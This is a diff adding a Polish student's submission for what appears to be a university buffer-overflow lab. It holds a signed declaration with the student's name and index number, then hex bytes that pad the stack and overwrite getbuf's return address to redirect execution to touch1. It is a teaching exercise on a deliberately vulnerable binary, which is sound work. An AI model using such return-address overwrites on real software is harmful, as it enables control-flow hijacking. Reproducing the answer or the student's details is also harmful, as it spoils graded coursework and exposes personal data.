@@ -1,0 +1,13 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Piotr Stachowicz, 337942
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+42 42 42 42 42 42 42 42 /* nic */ 
+42 42 42 42 42 42 42 42 /* nic */
+42 42 42 42 42 42 42 42 /* nic */
+99 1c 40 00 00 00 00 00 /* Nadpisujemy adres powrotu z getbuf (zamiast do test, to do touch1)
